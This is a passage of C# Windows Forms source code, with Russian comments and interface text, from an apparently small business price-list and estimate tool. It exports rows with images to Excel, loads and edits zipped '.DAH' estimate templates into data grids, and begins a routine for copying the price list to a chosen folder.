                                                    string namesF = tableDataGridView.Rows[i].Cells[j - 1].Value.ToString();
                                                    namesF = namesF.Replace(@"\", @"№");
                                                    namesF = namesF.Replace(@"/", @"%");
                                                    namesF = namesF.Replace("\n", "");

                                                    bool NOerr = false;
                                                    try
                                                    {
                                                        FileStream fs = File.Open(namesF, FileMode.Open);
                                                        if (fs != null) fs.Close();
                                                        NOerr = true;
                                                    }
                                                    catch (ArgumentException)
                                                    {
                                                        NOerr = false;
                                                    }
                                                    catch (FileNotFoundException)
                                                    {
                                                        NOerr = true;
                                                    }
                                                    catch (IOException)
                                                    {
                                                        NOerr = false;
                                                    }

                                                    if (NOerr == true) { image1.Save(pyt_k_file + namesF.ToString() + ".png", System.Drawing.Imaging.ImageFormat.Png); }
                                                    else
                                                    {
                                                        MessageBox.Show("Некоторые фотографии НЕ будут перенесены!!!\n" + "Исправте в прайсе артикул строки: " + (i + 1).ToString() + "\nАртикул: " + namesF + "\nЕсли это важно, исправте и повторите процедуру снова!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Stop);
                                                    }

                                                }
                                            }

                                        }

                                        int ha = (quantity_CurrentRow_new + 1) * 100 / (quantity_CurrentRow + 1);

                                        label_consol.Text = "Создаю строку в Ексельке:" + quantity_CurrentRow_new.ToString() + "   Прайс обработан на:" + ha.ToString() + "%";

                                        quantity_CurrentRow_new++;
                                    }

                                }



                                //  m_workSheet.Cells[20, 1].RowHeight = 50;  //60 символов в 1 строке
                                //читаем и помещаем файл в add
                                System.IO.FileInfo obj = new System.IO.FileInfo(filename); // получаем имя
                                                                                           // ActiveForm.Text = obj.Name;
                                char[] MyChar = { '.', 'x', 'l', 's', 'x' };
                                string Directory1 = filename.TrimEnd(MyChar); // путь к папке                                                           
                                                                              //меняем имя 1го листа:
                                m_workBook.Sheets[1].Name = obj.Name.TrimEnd(MyChar);// имя файла без пути! 
                            }
                            finally
                            {
                                label_consol.Text = "Сохраняю данные в новом файле...";
                                // Сохраняем файл с вставленным изображением    
                                m_workBook.SaveCopyAs(filename);
                                // m_workBook.ExportAsFixedFormat(XlFixedFormatType.xlTypePDF, "e:\\1.pdf");
                                //expression.ExportAsFixedFormat(Type, Filename, Quality, IncludeDocProperties, IgnorePrintAreas, From, To, OpenAfterPublish)
                                // Закрытие книги.
                                //  label_consol_2.Text = "Закрываю Excel и подчищаю хвосты..";
                                m_workBook.Close(false, "", null);
                                // Закрытие приложения Excel.
                                try { m_app.Quit(); } catch { }

                                m_workBook = null;
                                m_workSheet = null;
                                rg = null;
                                m_app = null;

                                GC.Collect();
                                label_consol.Text = "Файл удачно сохранен. И лежит в: " + filename.ToString();
                            }


                        }
                        catch
                        {
                            DialogResult rezult = MessageBox.Show("Невозможно сохранить файл, причин куча:\nexcel не дает доступа,\nнет доступа к папке,\nФаил сформировался с ошибками..", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            label_consol.Text = "Юзер передумал. Или не удалось сохранить.. Тут правды не найти.";
                        }

                        dialog_mess("Stop");
                    }
                }
                if (result == null || result == "") { label_consol.Text = "Друг! Там надо ввести Имя производителя было!"; }
            }
            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;















        }

        bool press_mouse_righ = false;
        private void tableDataGridView_MouseClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right)
            {
                press_mouse_righ = true;
            }

        }

        private void tableDataGridView_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
        {

        }


        //вставить шаблон
        public void button_догрузить_шаблон_Click(object sender, EventArgs e)
        {


            otclehivat_polzovatelia = false;
            label_consol_2.Text = "Попытка вставить шаблон!";

            string put_k_arhiv;
            string put_k_papke;
            string put_k_arhiv_zav;
            string имя_файла = имя_файла_шаблона;
            string gie = путь_и_имя_файла_шаблона;
            string путь = gie.Remove(gie.Length - имя_файла.Length, имя_файла.Length);
            Directory.CreateDirectory(путь + "tempDH");
            //1) распоковывае архив
            using (ZipFile zip1 = new ZipFile(путь_и_имя_файла_шаблона, Encoding.GetEncoding(866)))
            {
                //создаем путь для сохранения
                char[] MyChar = { '.', 'D', 'A', 'H', ' ' };
                string Directory1 = путь_и_имя_файла_шаблона.TrimEnd(MyChar);
                put_k_papke = Directory1;
                System.IO.FileInfo obj = new System.IO.FileInfo(путь_и_имя_файла_шаблона); // получаем имя 

                string name_file = obj.Name.TrimEnd(MyChar);// имя файла без пути! 
                try { zip1.ExtractAll(Environment.ExpandEnvironmentVariables(@путь + "tempDH")); } catch { MessageBox.Show("Рядом с файлом лежит папка с таким же именем ! Удали её и попробуй заново! \n Код ошибки: 003 \nНе смогла распаковать файл по пути: \n" + @путь + " пыталась создать папку \\tempDH"); }
            }

            try
            {
                string[] все_распок_папки = Directory.GetDirectories(@путь + "tempDH"); // путь к папке
                string papka_c_rasp = все_распок_папки[0];

                string fdfd12 = путь + "tempDH";
                int fdfd = fdfd12.Length;
                string путь1 = papka_c_rasp.Substring(fdfd + 1);

                put_k_arhiv = papka_c_rasp + "\\" + путь1 + ".DAH";
                put_k_arhiv_zav = papka_c_rasp + "\\_" + путь1 + ".DAH";
                string put_k_arhiv_PS = papka_c_rasp + "\\_PS_" + путь1 + ".DAH";
                // dataGridView_расчёт_2.Rows.Clear();
                // dataGridView_зависимость.Rows.Clear();
                textBox_P_S.Text = "";
                //примечание   нахер                
                // открываем файл
                /*
                using (StreamReader stream = new StreamReader(put_k_arhiv_PS))
                {
                    while (stream.Peek() >= 0)
                    {
                        // читаем строку из файла
                        textBox_P_S.Text = stream.ReadLine();
                    }
                    stream.Close();
                }
                */

                //грузим основное
                using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv, FileMode.Open)))
                {
                    int n = bw.ReadInt32();
                    int m = bw.ReadInt32() - 1; // -1 - это отказываемся от итого! 
                    int y = 0;
                    for (int i = 0; i < m; ++i)
                    {
                        if (i == m)
                        {
                        }
                        if (i < m)
                        {

                            try
                            {
                                dataGridView_расчёт_2.Rows.Insert(dataGridView_расчёт_2.CurrentCell.RowIndex + 1, 1);
                                int x = dataGridView_расчёт_2.CurrentCell.ColumnIndex;
                                y = dataGridView_расчёт_2.CurrentCell.RowIndex + 1;
                                dataGridView_расчёт_2.CurrentCell = dataGridView_расчёт_2.Rows[y].Cells[0];


                            }
                            catch
                            {
                                dataGridView_расчёт_2.Rows.Add();
                            }
                        }
                        for (int j = 0; j < n; ++j)
                        {
                            if (bw.ReadBoolean())
                            {
                                if (j != 4)
                                {
                                    if (j == 8)
                                    {
                                        string new_id = bw.ReadString();

                                        try
                                        {

                                            for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                                            {
                                                string nn = null;
                                                try { nn = dataGridView_расчёт_2.Rows[x].Cells[8].Value.ToString(); } catch { }
                                                if (nn != null && nn == new_id)
                                                {
                                                    new_id = new_id + "1";
                                                    x = 0;
                                                }
                                            }

                                            dataGridView_расчёт_2.Rows[y].Cells[j].Value = new_id;

                                        }
                                        catch { }
                                    }
                                    else
                                    {
                                        if (j == 9)
                                        {
                                            string new_id = bw.ReadString();

                                            try
                                            {

                                                for (int x = 0; x < dataGridView_расчёт_2.Rows.Count - 1; x++)
                                                {
                                                    string nn = null;
                                                    try { nn = dataGridView_расчёт_2.Rows[x].Cells[9].Value.ToString(); } catch { }
                                                    if (nn != null && nn == new_id)
                                                    {
                                                        new_id = new_id + "1";
                                                        x = 0;
                                                    }
                                                }

                                                dataGridView_расчёт_2.Rows[y].Cells[j].Value = new_id;

                                            }
                                            catch { }

                                        }
                                        else
                                        {

                                            dataGridView_расчёт_2.Rows[y].Cells[j].Value = bw.ReadString();
                                        }


                                    }




                                }
                                else
                                {
                                    string vfsd = bw.ReadString();
                                    try
                                    {
                                        //сюда..
                                        System.Drawing.Image img;
                                        using (var bmpTemp = new Bitmap(@papka_c_rasp + "\\" + i.ToString() + ".jpg"))
                                        {
                                            img = new Bitmap(bmpTemp);
                                        }


                                        dataGridView_расчёт_2.Rows[y].Cells[j].Value = img;


                                    }
                                    catch { }
                                }
                            }
                            else { bw.ReadBoolean(); }
                        }
                    }
                }


                // тут вопросы. 
                ////грузим зависимости
                using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv_zav, FileMode.Open)))
                {
                    int n = bw.ReadInt32();
                    int m = bw.ReadInt32() - 1;
                    int y = 0;
                    int z = 0;
                    try { if (dataGridView_зависимость.Rows.Count > 0) z = dataGridView_зависимость.Rows.Count - 1; } catch { }
                    for (int i = 0; i < m; ++i)
                    {
                        if (i == m)
                        {
                        }
                        if (i < m)
                        {


                            try
                            {

                                dataGridView_зависимость.Rows.Insert(dataGridView_зависимость.CurrentCell.RowIndex + 1, 1);
                                y = dataGridView_зависимость.CurrentCell.RowIndex + 1;
                                dataGridView_зависимость.CurrentCell = dataGridView_зависимость.Rows[y].Cells[0];

                            }
                            catch
                            {
                                dataGridView_зависимость.Rows.Add();
                                dataGridView_зависимость.Rows.Add();
                                dataGridView_зависимость.CurrentCell = dataGridView_зависимость.Rows[0].Cells[0];

                            }




                        }

                        for (int j = 0; j < n; ++j)
                        {
                            if (bw.ReadBoolean())
                            {

                                string dd = bw.ReadString();

                                if (j == 4 && dd != null)
                                {
                                    if (z > 0)
                                    {
                                        for (int f = 0; f < z; f++)
                                        {
                                            string rer = null;
                                            try { rer = dataGridView_зависимость.Rows[f].Cells[4].Value.ToString(); } catch { }
                                            if (rer != null && rer == dd) { dd = dd + "1"; f = 0; }

                                        }

                                    }


                                }
                                if (j == 5 && dd != null)
                                {

                                    if (z > 0)
                                    {
                                        for (int f = 0; f < z; f++)
                                        {
                                            string rer = null;
                                            try { rer = dataGridView_зависимость.Rows[f].Cells[5].Value.ToString(); } catch { }
                                            if (rer != null && rer == dd) { dd = dd + "1"; f = 0; }

                                        }

                                    }

                                }


                                dataGridView_зависимость.Rows[y].Cells[j].Value = dd;

                            }
                            else { bw.ReadBoolean(); }
                        }
                    }
                }

                try { Directory.Delete(@путь + "tempDH", true); } catch { }



                int nr, nc;
                nc = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                nr = dataGridView_расчёт_2.RowCount;
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[6].Value != null || dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[7].Value != null) { }
                else
                {
                    if ((nc > 0) && (nr > 1))
                    {
                        dataGridView_расчёт_2.Rows.RemoveAt(nr - 2);
                    }
                }
                try
                {
                    int nr1;
                    nr1 = dataGridView_зависимость.RowCount - 1;
                }
                catch { }


                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[1].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[2].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[3].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[5].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value != null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value != null
                  )
                {
                    string itigo = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value.ToString();
                    string thena = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value.ToString();
                    int nr33, nc33;
                    nc33 = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                    nr33 = dataGridView_расчёт_2.RowCount;
                    if ((nc33 > 0) && (nr33 > 1))
                    {
                        dataGridView_расчёт_2.Rows.RemoveAt(nr33 - 2);
                    }
                    else
                    {
                    }
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value = itigo;
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value = thena;
                }
                else
                {
                }
                if (dataGridView_расчёт_2.RowCount - 1 > 0)
                {
                    for (int x = 0; x < dataGridView_зависимость.RowCount - 1; x++)
                    {
                        string id = null;
                        try { id = dataGridView_зависимость.Rows[x].Cells[4].Value.ToString(); } catch { }

                        if (id != null)
                        {
                            for (int a = 0; a < dataGridView_расчёт_2.NewRowIndex; a++)
                            {
                                string idd = null;
                                try
                                {
                                    idd = dataGridView_расчёт_2.Rows[a].Cells[8].Value.ToString();
                                }
                                catch { }
                                if (id == idd)
                                {
                                    dataGridView_расчёт_2.Rows[a].Cells[0].Style.BackColor = Color.Wheat;
                                }
                            }
                        }
                    }
                }
                try
                {
                    ///
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8] != null)
                    {
                        dataGridView_муляж.Rows.Clear();
                        string dsd = null;
                        try { dsd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }

                        if (dsd != null)
                        {
                            int nomber = 1;
                            for (int a = 0; a < dataGridView_зависимость.Rows.Count - 1; a++)
                            {
                                if (dsd == dataGridView_зависимость.Rows[a].Cells[4].Value.ToString())
                                {
                                    dataGridView_муляж.Rows.Add(nomber.ToString(), dataGridView_зависимость.Rows[a].Cells[0].Value, dataGridView_зависимость.Rows[a].Cells[1].Value, dataGridView_зависимость.Rows[a].Cells[2].Value, dataGridView_зависимость.Rows[a].Cells[3].Value);
                                    nomber++;
                                }
                            }
                        }
                        else { dataGridView_муляж.Visible = false; groupBox7.Visible = false; }
                    }////
                }
                catch { }


                //пробуем закрасить раздел! 
                for (int a = 0; a < dataGridView_расчёт_2.NewRowIndex; a++)
                {
                    string е5 = null;
                    string е6 = null;
                    string е7 = null;
                    try
                    {
                        е5 = dataGridView_расчёт_2.Rows[a].Cells[5].Value.ToString();
                    }
                    catch { }
                    try
                    {
                        е6 = dataGridView_расчёт_2.Rows[a].Cells[6].Value.ToString();
                    }
                    catch { }
                    try
                    {
                        е7 = dataGridView_расчёт_2.Rows[a].Cells[7].Value.ToString();
                    }
                    catch { }
                    if (е5 == null && е6 == null && е7 == null)
                    {  //dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                       // dataGridView_расчёт_2.Rows[a].Cells[0].Style.BackColor = Color.Wheat;

                        for (int i = 0; i < 8; i++)
                        {
                            dataGridView_расчёт_2.Rows[a].Cells[i].Style.BackColor = Color.PowderBlue;
                        }
                        dataGridView_расчёт_2.Rows[a].Cells[10].Style.BackColor = Color.PowderBlue;

                    }
                }



























                label_consol_2.Text = "Добавлен шаблон";

                try
                { System.IO.File.Delete(путь_и_имя_файла_шаблона); }
                catch { }

            }
            catch
            {
                MessageBox.Show("Невозможно вставить выбранный шаблон. Файл поврежден!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                label_consol_2.Text = "Неполучилось вставить шаблон! файл поврежден.";
            }

            this.Text = "Прайс Дахмиры        источник:" + istohtik_bazi;
            otclehivat_polzovatelia = true;
            button_догрузить_шаблон.Visible = false;
            razhet_label.Visible = true;//требуется расчёт
        }


        public void button_редактировать_шаблон_Click(object sender, EventArgs e)
        {
            //имя_файла - путь к файлу!
            otclehivat_polzovatelia = false;
            label_consol_2.Text = "Попытка вставить шаблон!";
            string put_k_arhiv;
            string put_k_papke;
            string put_k_arhiv_zav;
            string имя_файла = имя_файла_шаблона;
            string gie = путь_и_имя_файла_шаблона;
            string путь = gie.Remove(gie.Length - имя_файла.Length, имя_файла.Length);
            Directory.CreateDirectory(путь + "tempDH");
            //1) распоковывае архив
            using (ZipFile zip1 = new ZipFile(путь_и_имя_файла_шаблона, Encoding.GetEncoding(866)))
            {
                //создаем путь для сохранения
                char[] MyChar = { '.', 'D', 'A', 'H', ' ' };
                string Directory1 = путь_и_имя_файла_шаблона.TrimEnd(MyChar);
                put_k_papke = Directory1;
                System.IO.FileInfo obj = new System.IO.FileInfo(путь_и_имя_файла_шаблона); // получаем имя 
                string name_file = obj.Name.TrimEnd(MyChar);// имя файла без пути! 
                try { zip1.ExtractAll(Environment.ExpandEnvironmentVariables(@путь + "tempDH")); } catch { MessageBox.Show("Рядом с файлом лежит папка с таким же именем ! Удали её и попробуй заново! \n Код ошибки: 004 \nНе смогла распаковать файл по пути: \n" + @путь + " пыталась создать папку \\tempDH"); }
            }
            try
            {
                string[] все_распок_папки = Directory.GetDirectories(@путь + "tempDH"); // путь к папке
                string papka_c_rasp = все_распок_папки[0];
                string fdfd12 = путь + "tempDH";
                int fdfd = fdfd12.Length;
                string путь1 = papka_c_rasp.Substring(fdfd + 1);
                put_k_arhiv = papka_c_rasp + "\\" + путь1 + ".DAH";
                put_k_arhiv_zav = papka_c_rasp + "\\_" + путь1 + ".DAH";
                string put_k_arhiv_PS = papka_c_rasp + "\\_PS_" + путь1 + ".DAH";
                textBox_P_S.Text = "";
                //примечание                   
                // открываем файл
                using (StreamReader stream = new StreamReader(put_k_arhiv_PS))
                {
                    while (stream.Peek() >= 0)
                    {
                        // читаем строку из файла
                        textBox_P_S.Text = stream.ReadLine();
                    }
                    stream.Close();
                }

                dataGridView_расчёт_2.Rows.Clear();
                dataGridView_зависимость.Rows.Clear();
                label_rachetka.Text = "Расчетка: Новая";
                textBox_P_S.Text = "";
                //грузим основное
                using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv, FileMode.Open)))
                {
                    int n = bw.ReadInt32();
                    int m = bw.ReadInt32();
                    for (int i = 0; i < m; ++i)
                    {
                        if (i == m)
                        {
                        }
                        if (i < m)
                        {
                            dataGridView_расчёт_2.Rows.Add();
                        }
                        for (int j = 0; j < n; ++j)
                        {
                            if (bw.ReadBoolean())
                            {
                                if (j != 4) { dataGridView_расчёт_2.Rows[i].Cells[j].Value = bw.ReadString(); }
                                else
                                {
                                    string vfsd = bw.ReadString();
                                    try
                                    {
                                        //сюда..
                                        System.Drawing.Image img;
                                        using (var bmpTemp = new Bitmap(@papka_c_rasp + "\\" + i.ToString() + ".jpg"))
                                        {
                                            img = new Bitmap(bmpTemp);
                                        }
                                        dataGridView_расчёт_2.Rows[i].Cells[j].Value = img;
                                    }
                                    catch { }
                                }
                            }
                            else { bw.ReadBoolean(); }
                        }
                    }
                }
                ////грузим зависимости
                using (BinaryReader bw = new BinaryReader(File.Open(put_k_arhiv_zav, FileMode.Open)))
                {
                    int n = bw.ReadInt32();
                    int m = bw.ReadInt32();
                    for (int i = 0; i < m; ++i)
                    {
                        if (i == m)
                        {
                        }
                        if (i < m)
                        {
                            dataGridView_зависимость.Rows.Add();
                        }
                        for (int j = 0; j < n; ++j)
                        {
                            if (bw.ReadBoolean())
                            {
                                dataGridView_зависимость.Rows[i].Cells[j].Value = bw.ReadString();
                            }
                            else { bw.ReadBoolean(); }
                        }
                    }
                }
                try { Directory.Delete(@путь + "tempDH", true); } catch { }
                int nr, nc;
                nc = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                nr = dataGridView_расчёт_2.RowCount;
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[6].Value != null || dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.RowCount - 2].Cells[7].Value != null) { }
                else
                {
                    if ((nc > 0) && (nr > 1))
                    {
                        dataGridView_расчёт_2.Rows.RemoveAt(nr - 2);

                    }
                }
                try
                {
                    int nr1;
                    nr1 = dataGridView_зависимость.RowCount - 1;
                    //       dataGridView_зависимость.Rows.RemoveAt(nr1 - 1);
                }
                catch { }
                if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[0].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[1].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[2].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[3].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[5].Value == null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value != null
                  && dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value != null
                  )
                {
                    string itigo = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[6].Value.ToString();
                    string thena = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.Rows.Count - 2].Cells[7].Value.ToString();
                    int nr33, nc33;
                    nc33 = dataGridView_расчёт_2.Columns.Count; // количество столбцов
                    nr33 = dataGridView_расчёт_2.RowCount;
                    if ((nc33 > 0) && (nr33 > 1))
                    {
                        dataGridView_расчёт_2.Rows.RemoveAt(nr33 - 2);
                    }
                    else
                    {
                    }
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[6].Value = itigo;
                    dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.NewRowIndex].Cells[7].Value = thena;
                }
                else
                {
                }
                if (dataGridView_расчёт_2.RowCount - 1 > 0)
                {
                    for (int x = 0; x < dataGridView_зависимость.RowCount - 1; x++)
                    {
                        string id = null;
                        try { id = dataGridView_зависимость.Rows[x].Cells[4].Value.ToString(); } catch { }

                        if (id != null)
                        {
                            for (int a = 0; a < dataGridView_расчёт_2.NewRowIndex; a++)
                            {
                                string idd = null;
                                try
                                {
                                    idd = dataGridView_расчёт_2.Rows[a].Cells[8].Value.ToString();
                                }
                                catch { }
                                if (id == idd)
                                {
                                    dataGridView_расчёт_2.Rows[a].Cells[0].Style.BackColor = Color.Wheat;
                                }
                            }
                        }
                    }
                }
                try
                {
                    ///
                    if (dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8] != null)
                    {
                        dataGridView_муляж.Rows.Clear();
                        string dsd = null;
                        try { dsd = dataGridView_расчёт_2.Rows[dataGridView_расчёт_2.CurrentCell.RowIndex].Cells[8].Value.ToString(); } catch { }

                        if (dsd != null)
                        {
                            int nomber = 1;
                            for (int a = 0; a < dataGridView_зависимость.Rows.Count - 1; a++)
                            {
                                if (dsd == dataGridView_зависимость.Rows[a].Cells[4].Value.ToString())
                                {
                                    dataGridView_муляж.Rows.Add(nomber.ToString(), dataGridView_зависимость.Rows[a].Cells[0].Value, dataGridView_зависимость.Rows[a].Cells[1].Value, dataGridView_зависимость.Rows[a].Cells[2].Value, dataGridView_зависимость.Rows[a].Cells[3].Value);
                                    nomber++;
                                }
                            }
                        }
                        else { dataGridView_муляж.Visible = false; groupBox7.Visible = false; }
                    }////
                }
                catch { }
                label_consol_2.Text = "Загружен шаблон для редактирования";
                try { System.IO.File.Delete(путь_и_имя_файла_шаблона); } catch { }


                //вставляем путь к файлу для последующего сохранения 05/02/2022
                string путь_к_базе_0 = Program.f1.istohtik_bazi;
                System.IO.FileInfo new_put_0 = new System.IO.FileInfo(путь_к_базе_0);
                string directory_0 = new_put_0.DirectoryName;
                label_rachetka.Text = "Расчет: " + directory_0 + "\\шаблоны\\" + имя_файла;


                //пробуем закрасить раздел! 
                for (int a = 0; a < dataGridView_расчёт_2.NewRowIndex; a++)
                {
                    string е5 = null;
                    string е6 = null;
                    string е7 = null;
                    try
                    {
                        е5 = dataGridView_расчёт_2.Rows[a].Cells[5].Value.ToString();
                    }
                    catch { }
                    try
                    {
                        е6 = dataGridView_расчёт_2.Rows[a].Cells[6].Value.ToString();
                    }
                    catch { }
                    try
                    {
                        е7 = dataGridView_расчёт_2.Rows[a].Cells[7].Value.ToString();
                    }
                    catch { }
                    if (е5 == null && е6 == null && е7 == null)
                    {  //dataGridView_Заказ[w, q].Style.BackColor = Color.FromArgb(255, 255, 255, 255);
                       // dataGridView_расчёт_2.Rows[a].Cells[0].Style.BackColor = Color.Wheat;
                        for (int i = 0; i < 8; i++)
                        {
                            dataGridView_расчёт_2.Rows[a].Cells[i].Style.BackColor = Color.PowderBlue;
                        }
                        dataGridView_расчёт_2.Rows[a].Cells[10].Style.BackColor = Color.PowderBlue;
                    }
                }
            }
            catch
            {
                MessageBox.Show("Невозможно вставить выбранный шаблон. Файл или поврежден!", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
                label_consol_2.Text = "Неполучилось вставить шаблон! файл поврежден.";
            }
            button_редактировать_шаблон.Visible = false;
            otclehivat_polzovatelia = true;
            razhet_label.Visible = true;
        }
        #endregion шаблоны

        #region сохранить прайс как


        string name_put_save = "";
        private void сделатьКопиюПрайсаВToolStripMenuItem_Click(object sender, EventArgs e)
        {
            label_consol.Text = "Пользователь решил слить прайс..";

            // чистим хвост прайса
            DirectoryInfo dirInfo = new DirectoryInfo("rez\\new_praise\\resource");

            foreach (FileInfo file in dirInfo.GetFiles())
            {
                file.Delete();
            }

            //чистим хвост шаблонов
            DirectoryInfo dirInfo1 = new DirectoryInfo("rez\\new_praise\\шаблоны");

            foreach (FileInfo file1 in dirInfo1.GetFiles())
            {
                file1.Delete();
            }

            System.IO.File.Delete(@"rez\new_praise\name.ini");
            System.IO.File.Delete(@"rez\new_praise\dir.ini");
            name_put_save = "";

            if (DialogResult.Yes == MessageBox.Show("Данный процесс занимает много времени и остановить его нельзя!\n Вы уверенны ? " +
                "1) Убедится, что в папке с программой и куда собрался сохранять есть свободное место и доступ.\n" +
                "2) Если прайс изменялся и не сохранялся возможны ошибки!\n" +
                "3) Эта опция не была оттестирована группой тестировщиков.", "Уточнение.", MessageBoxButtons.YesNo, MessageBoxIcon.Information))
            {
                bool ok = false;
                string name_put = "";

                using (var fbd = new FolderBrowserDialog())   //создаем путь к папке в файл
                {
                    //fbd.RootFolder = System.Environment.SpecialFolder.MyDocuments;
                    fbd.Description = "Выбери место (папку) куда будет сохраняться прайс:";
                    DialogResult result = fbd.ShowDialog();
                    if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(fbd.SelectedPath))
                    {
                        //  string[] files = Directory.GetFiles(fbd.SelectedPath);
                        // System.Windows.Forms.MessageBox.Show("Files found: " + files.Length.ToString(), "Message");
                        name_put = fbd.SelectedPath;

                        try
                        {
                            FileStream fileStream = File.Open("rez\\new_praise\\dir.ini", FileMode.Create);
                            // получаем поток
                            StreamWriter output = new StreamWriter(fileStream);
                            // записываем текст в поток
                            output.Write(name_put);
                            label_consol.Text = "Данные будут сохранены по пути:" + name_put;
                            // закрываем поток
                            output.Close();
                            ok = true;
                            name_put_save = name_put;
                        }
                        catch { }


                    }
                    else
                    {
                        label_consol.Text = "Пользователь передумал клонировать прайс...";
                    }
                }

                if (ok == true)   //создаем имя  файла в файл
                {
                    string result1 = Microsoft.VisualBasic.Interaction.InputBox("Придумай имя прайсу:", "Имя прайса");
                    label_consol.Text = "Идет копирование данных..";
                    if (result1 != "")//если пользователь, что то родил в строку.
                    {

                        try
                        {
                            FileStream fileStream = File.Open("rez\\new_praise\\name.ini", FileMode.Create);
                            // получаем поток
                            StreamWriter output = new StreamWriter(fileStream);
                            // записываем текст в поток
                            output.Write(result1);
                            // закрываем поток
                            output.Close();
                        }
                        catch { ok = false; }
                        name_put = "rez\\new_praise\\resource\\" + result1 + ".ini";

                    }
                    else { ok = false; label_consol.Text = "Пользователь передумал клонировать прайс..."; }
                }


                if (ok == true)  //сохраняем таблицу.
                {

                    button_добавить.Enabled = true;
                    button_поиск.Enabled = false;
                    groupBox_поиск.Visible = true;
                    groupBox_добавить.Visible = false;

                    //обновим поиск
                    // загоним списокс базы. в это окно

                    // 1) слижем все данные с графы производитель
                    comboBox1_поиск.Items.Clear(); //чистим список 1

                    naimen_proizvoditel_FULL = new string[this.tableBindingSource.Count];
                    naimen_naimenovania_FULL = new string[this.tableBindingSource.Count];
                    naimen_артикул_FULL = new string[this.tableBindingSource.Count];
                    naimen_цена_FULL = new string[this.tableBindingSource.Count];
                    for (int a = 0; a < this.tableBindingSource.Count; a++)
                    {
                        naimen_proizvoditel_FULL[a] = tableDataGridView[1, a].Value.ToString();
                        naimen_naimenovania_FULL[a] = tableDataGridView[2, a].Value.ToString();
                        naimen_артикул_FULL[a] = tableDataGridView[3, a].Value.ToString();
                        naimen_цена_FULL[a] = tableDataGridView[5, a].Value.ToString();
                    }

                    // уберем повторы из списка производителя
                    naimen_proizvoditel = naimen_proizvoditel_FULL.Distinct().ToArray();

                    массив_производителей = new string[naimen_proizvoditel.Count()][]; //присвоили 3 ячейки из списка
                    массив_наименования = new string[naimen_proizvoditel.Count()][];
                    массив_артикул = new string[naimen_proizvoditel.Count()][];
                    массив_цена = new string[naimen_цена_FULL.Count()][];


                    for (int x = 0; x < naimen_proizvoditel.Count(); x++) //3 in
                    {
                        int k = 0;
                        for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                        {
                            if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[x]) { k++; }
                        }
                        массив_производителей[x] = new string[k];
                        массив_наименования[x] = new string[k];
                        массив_артикул[x] = new string[k];
                        массив_цена[x] = new string[k];

                    }

                    for (int z = 0; z < naimen_proizvoditel.Count(); z++) // 3 in
                    {
                        int q = 0;
                        for (int y = 0; y < naimen_proizvoditel_FULL.Count(); y++) // 8 in
                        {


                            if (naimen_proizvoditel_FULL[y] == naimen_proizvoditel[z])
                            {

                                массив_производителей[z][q] = naimen_proizvoditel_FULL[y];
                                массив_наименования[z][q] = naimen_naimenovania_FULL[y];
                                массив_артикул[z][q] = naimen_артикул_FULL[y];
                                массив_цена[z][q] = naimen_цена_FULL[y];
                                q++;
                            }
                        }




                    }

